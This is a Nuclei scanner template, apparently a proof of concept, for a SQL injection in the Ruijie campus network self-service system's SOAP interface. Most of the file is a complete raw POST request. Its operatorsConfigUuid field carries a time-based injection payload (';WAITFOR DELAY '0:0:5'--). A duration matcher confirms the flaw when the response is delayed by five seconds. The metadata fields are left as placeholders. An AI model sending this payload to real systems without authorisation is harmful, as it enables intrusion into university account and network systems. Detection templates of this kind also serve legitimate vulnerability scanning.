pocs/nuclei/ruijie-schools-sqli.yaml

id: ruijie-schools-sqli

info:
  name: Template Name
  author: apple
  severity: high
  description: 锐捷校园网自助服务系统selfservice接口存在SQL注入漏洞
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |-
        POST /selfservice/service/operatorReportorRoamService HTTP/1.1
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Cookie: JSESSIONID=42E7A33A54CABB1580E34F01B3D63480; JSESSIONID=0616C2E6B689FD5702EE3E2203D660FB
        Connection: close
        SOAPAction: 1
        Content-Type: text/xml;charset=UTF-8
        Host: {{Hostname}}
        Content-Length: 873

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com" xmlns:dom="http://domain.service.webservice.common.spl.ruijie...">
           <soapenv:Header/>
           <soapenv:Body>
              <ser:queryAccountNumReportDataDetail>
                 <ser:in0>
                    <!--type: dateTime-->
                    <dom:endTime>2008-09-29T09:49:45</dom:endTime>
                    <!--type: int-->
                    <dom:limit>3</dom:limit>
                    <!--type: int-->
                    <dom:offSet>3</dom:offSet>
                    <!--type: string-->
                    <dom:operatorsConfigUuid>aeoliam venit';WAITFOR DELAY '0:0:5'--</dom:operatorsConfigUuid>
                    <!--type: dateTime-->
                    <dom:startTime>2014-06-09T23:15:04+08:00</dom:startTime>
                 </ser:in0>
              </ser:queryAccountNumReportDataDetail>
           </soapenv:Body>
        </soapenv:Envelope>
        
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'